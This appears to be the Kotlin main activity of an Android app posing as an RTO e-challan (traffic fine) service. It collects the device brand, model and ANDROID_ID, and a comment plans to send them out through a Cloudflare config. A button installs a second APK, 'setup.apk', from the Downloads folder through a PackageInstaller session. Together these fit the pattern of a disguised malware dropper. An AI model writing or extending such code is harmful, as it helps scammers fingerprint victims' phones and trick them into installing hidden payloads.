package com.example.rtoechallan

import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.pm.PackageInstaller
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.widget.Button
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import java.io.File
import java.io.FileInputStream

class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // --- Vivo / Device ID Logic ---
        val deviceBrand = Build.MANUFACTURER // Asli Brand (e.g., vivo)
        val deviceModel = Build.MODEL        // Asli Model (e.g., V2150)
        val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        
        // Aap is data ko apne Cloudflare NetworkConfig file ke zariye bhej sakte hain

        val btnInstall = findViewById<Button>(R.id.btnInstall)
        btnInstall.setOnClickListener {
            // Hum check karenge ki setup.apk Download folder mein hai ya nahi
            val apkFile = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "setup.apk")
            
            if (apkFile.exists()) {
                startSessionInstallation(this, apkFile)
            } else {
                Toast.makeText(this, "setup.apk not found in Downloads!", Toast.LENGTH_LONG).show()
            }
        }
    }

    private fun startSessionInstallation(context: Context, file: File) {
        try {
            val packageInstaller = context.packageManager.packageInstaller
            val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
            
            val sessionId = packageInstaller.createSession(params)
            val session = packageInstaller.openSession(sessionId)
            
            val inputStream = FileInputStream(file)
            val outputStream = session.openWrite("package_install_session", 0, file.length())
            
            inputStream.copyTo(outputStream)
            
            session.fsync(outputStream)
            inputStream.close()
            outputStream.close()

            // Result ke liye intent
            val intent = Intent(context, InstallReceiver::class.java)
            val pendingIntent = PendingIntent.getBroadcast(
                context, 
                sessionId, 
                intent, 
                PendingIntent.FLAG_MUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
            )
            
            session.commit(pendingIntent.intentSender)
            session.close()

        } catch (e: Exception) {
            Toast.makeText(this, "Error: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }
}

